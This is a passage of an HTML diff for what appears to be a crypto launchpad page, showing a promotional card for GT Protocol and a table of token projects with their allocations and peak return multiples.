+                                            </div>
+                                        </div>
+                                        <div class="h-40"></div>
+                                        <div class="relative flex w-full flex-col items-center bg-base-100/80 p-6 backdrop-blur-sm sm:p-6">
+                                            <div class="mt-2 flex flex-col items-center gap-3 md:flex-row"><img class="h-14 w-14" src="project_logo_gt-protocol1700055892967.png" alt="" loading="eager" style="opacity: 1;">
+                                                <div class="text-center text-3xl font-bold tracking-wide">GT Protocol</div>
+                                            </div>
+                                            <div class="mt-6 line-clamp-3 text-center text-sm sm:text-base">Leveraging advanced Web3 AI execution technology, GT Protocol introduces a revolutionary approach to AI-portfolio management, AI-trading, and investments across CeFi, DeFi, and NFT markets. With a user-friendly AI conversational interface that responds to prompts and voice commands, it makes sophisticated investment strategies accessible to a broad audience. This cutting-edge technology, designed for seamless integration with both Web3 and Web2 platforms, embarks on a mission to onboard 100 Million users, creating an AI Layer for Web3 that democratizes investment opportunities. </div>
+                                            <div class="mt-8 flex w-full justify-between text-lg font-bold">
+                                                <div class="flex" data-tip="24 Jan, 12:00 GMT"><time datetime="2024-01-24T12:00:00.000Z" title="">Ends in 10 hours</time></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mx-auto flex w-full max-w-7xl flex-col px-6 sm:px-10">
+                                <div class="mb-12 mt-36 flex items-center justify-between gap-6">
+                                    <div class="w-full text-2xl font-black text-base-content/70 sm:text-3xl">Projects</div><input class="input input-bordered input-md w-24 font-normal placeholder-base-content/50 md:w-36" placeholder="Search" type="text" value="">
+                                </div>
+                                <div>
+                                    <table class="table table-zebra table-lg">
+                                        <thead>
+                                            <tr class="text-sm">
+                                                <th class="w-1/2"></th>
+                                                <th class="w-1/4 max-md:hidden">Total Allocation</th>
+                                                <th class="w-1/4 text-right">
+                                                    <div class="md:hidden">Total Allocation</div>
+                                                    <div>ATH</div>
+                                                </th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_w3w1705863407732.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Web3War</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 400,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 400,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_sociapol1705080458655.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">SociaPol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 385,250</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 385,250</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gamegpt1704563745429.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">GameGPT</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 710,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 710,000</div>
+                                                    <div>8.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_brcport1703854277257.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">BRCport</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 46,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 46,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_magic-square1704812909329.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Magic Square</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,200,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,200,000</div>
+                                                    <div>6.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_oval31702285437999.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">OVAL3</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 500,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 500,000</div>
+                                                    <div>2.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_liquid-crypto1702039571414.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Liquid Crypto</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 300,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 300,000</div>
+                                                    <div>2.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_script1701450879750.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Script Network</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 149,995</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 149,995</div>
+                                                    <div>3.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_finceptor1701339593784.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Finceptor</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 299,992</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 299,992</div>
+                                                    <div>6.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gt-protocol1700055892967.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">GT Protocol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 300,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 300,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_kryptonite1691498923890.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Kryptonite</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 800,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 800,000</div>
+                                                    <div>19.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_paysenger1688368699985.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Paysenger</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 200,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 200,000</div>
+                                                    <div>1.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_sophiaverse1685707201222.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">SophiaVerse</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 500,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 500,000</div>
+                                                    <div>9.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_rebase1685349677889.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Rebase</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 600,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 600,000</div>
+                                                    <div>5.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_turbos-finance1683621529326.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Turbos Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 500,002</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 500,002</div>
+                                                    <div>1.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_arbipad1683535211234.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">ArbiPad</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 500,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 500,000</div>
+                                                    <div>5.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_tenet1683271510946.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">TENET</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 500,013</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 500,013</div>
+                                                    <div>17.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_suipad1682421780759.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">SuiPad</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 220,001</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 220,001</div>
+                                                    <div>6.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_karate-combat1681297332636.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Karate Combat</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 3,000,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 3,000,000</div>
+                                                    <div>6.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_spartadex1681459836592.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">SpartaDEX</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 100,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 100,000</div>
+                                                    <div>13.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_coinzix1680609682567.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">COINZIX</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 915,848</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 915,848</div>
+                                                    <div>3.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_cyberarena1684945278729.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">CyberArena AR/VR</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,113,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,113,000</div>
+                                                    <div>3.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_xcad-play1679420175758.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">PLAY</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 150,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 150,000</div>
+                                                    <div>8.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_podfast1677234731975.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">PodFast</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 199,968</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 199,968</div>
+                                                    <div>20.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_cryptogpt1676878057902.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">LayerAI</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,499,987</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,499,987</div>
+                                                    <div>29.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_degen-zoo1676642010999.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Degen Zoo</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 2,261,718</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 2,261,718</div>
+                                                    <div>14.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_rejuve1676538220186.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Rejuve.AI</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,500,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,500,000</div>
+                                                    <div>9.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_wistaverse1682935321060.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Wistaverse</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 650,997</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 650,997</div>
+                                                    <div>1.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_mtg1673948014632.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">MTG</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 300,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 300,000</div>
+                                                    <div>3.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_atlas-navi1667244415047.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Atlas Navi</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 150,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 150,000</div>
+                                                    <div>2.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_iguverse1666778153308.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">IguVerse</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 151,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 151,000</div>
+                                                    <div>3.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_get-kicks1664718123182.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">GetKicks</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 300,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 300,000</div>
+                                                    <div>2.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_sweat-economy.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Sweat Economy</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 2,000,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 2,000,000</div>
+                                                    <div>12.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_primal1687783300574.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">PRIMAL</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,405,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,405,000</div>
+                                                    <div>10.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_skeb1687783295973.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Skeb Coin</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 595,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 595,000</div>
+                                                    <div>3.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_amazy1687783295968.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">AMAZY</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 250,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 250,000</div>
+                                                    <div>17.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_befitter1687783299704.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">beFITTER</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 600,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 600,000</div>
+                                                    <div>14.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_wingriders1687783296053.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">WingRiders</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 750,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 750,000</div>
+                                                    <div>2.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_zenogakki1687783295999.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Zenogakki</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 50,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 50,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_step-app1687783298936.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Step app</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 2,750,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 2,750,000</div>
+                                                    <div>149.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_adaswap1687783302552.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">AdaSwap</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>12.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_xana1687783295993.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">XANA</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 895,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 895,000</div>
+                                                    <div>15.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gamium1687783295191.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Gamium</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>43.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_dragon-sb1687783295995.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">DragonSB</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_defiato1687783295997.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">DeFiato</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 595,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 595,000</div>
+                                                    <div>2.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_spellfire1687783309072.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Spellfire</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 245,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 245,000</div>
+                                                    <div>6.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_fantom-maker1687783295178.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Fantom Maker</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>4.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_chainport1687783295983.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">ChainPort</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 4,000,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 4,000,000</div>
+                                                    <div>1.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_ftribe-fighters1687783300215.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Ftribe Fighters</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>9.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_mgg1687783298821.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Meta Gaming Guild</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>4.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_metagods1687783300695.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">MetaGods</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>36.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_forward1687783298826.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Forward Protocol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_wam1687783301225.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">WAM</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 280,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 280,000</div>
+                                                    <div>9.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_solice1687783309068.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Solice</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
